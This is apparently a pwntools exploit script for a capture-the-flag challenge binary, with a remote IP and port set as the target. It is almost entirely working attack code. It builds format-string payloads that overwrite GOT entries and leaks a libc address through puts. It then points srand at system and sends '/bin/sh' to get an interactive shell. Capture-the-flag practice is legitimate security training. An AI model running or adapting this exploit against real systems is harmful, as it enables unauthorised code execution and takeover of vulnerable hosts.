from pwn import *
context.arch = 'amd64'

TARGET = './chall'
HOST = '35.186.153.116'
PORT = 5002

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

ret = 0x080484ee

def fsb(target,value):
    payload = ''
    payload += '?   '
    for i in range(4):
        payload += p32(target+i)

    offset = len(payload)
    for i in range(4):
        c = ((value >> i*8) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += '%' + str(c) +'c%' + str(5+i) + '$hhn'
        offset += c
    return payload 

def fsb2(target, value, target2, value2):
    payload = ''
    payload += '?   '
    for i in range(4):
        payload += p32(target+i) 
    for i in range(4):
        payload += p32(target2+i)

    offset = len(payload)
    for i in range(4):
        c = ((value >> i*8) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += '%' + str(c) +'c%' + str(5+i) + '$hhn'
        offset += c

    for i in range(4):
        c = ((value2 >> i*8) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += '%' + str(c) +'c%' + str(9+i) + '$hhn'
        offset += c

    return payload 
while(1): 
    r = start()

    # payload = fsb(elf.got.exit, 0x804871b)
    payload = fsb2(elf.got.exit, 0x804871b, elf.got.rand, ret)
    payload += '\n\\' 
    r.sendafter('program:', payload)
    try:
        r.recvuntil('program:')
        break
    except:
        r.close()


context.log_level = 'debug'
if args.D:
    debug(r, [0x95e, 0xb54, 0xd2d, 0xbc6, 0xd53])
r.send("?   " + p32(elf.got.puts) + "%5$s\n\\")
r.recvuntil('\n')
leak = u32(r.recvuntil('\n')[0x8:0xc])
dbg("leak")
base = leak - 0x5fca0
system = base + 0x3ada0

payload = fsb(elf.got.srand, system)
payload += '\n\\' 
r.sendafter('program:', payload)

payload = '/bin/sh\x00'
payload += '\n\\'
r.sendafter('program:', payload)



r.interactive()
r.close()
